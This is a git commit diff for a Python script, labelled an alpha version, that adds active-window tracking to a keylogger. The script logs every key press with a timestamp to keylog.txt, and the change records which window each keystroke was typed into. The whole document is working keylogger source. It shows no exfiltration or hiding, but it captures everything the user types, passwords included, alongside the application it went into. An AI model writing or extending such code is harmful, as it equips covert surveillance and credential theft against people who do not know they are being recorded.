75f776af9640114578d523282dc2c2cdfd722026
Stas <stasnovalenco3@gmail.com>
2025-03-16 22:20:30 +0200

    Finished first Alpha Version

--- script.py
+++ script.py
@@ -1,16 +1,24 @@
 from pynput import keyboard
 from time import gmtime, strftime
+import pygetwindow as gw
 
 LOG_FILE= "keylog.txt"
+last_window= None
 def save_to_file(data):
     with open(LOG_FILE, "a") as file:
         file.write(f'[{strftime("%Y-%m-%d %H:%M", gmtime())}] {data} \n')
 
-
-
+    
 def on_press(key):
+    global last_window
+    active_window= gw.getActiveWindowTitle()
+    if active_window != last_window:
+        save_to_file(f"Switched to: {active_window}")
+        print(f"Switched to: {active_window}")
+        last_window= active_window
     print(f"Typed: {key}")
     save_to_file(f"Typed: {key}")
+
 
 
 with keyboard.Listener(
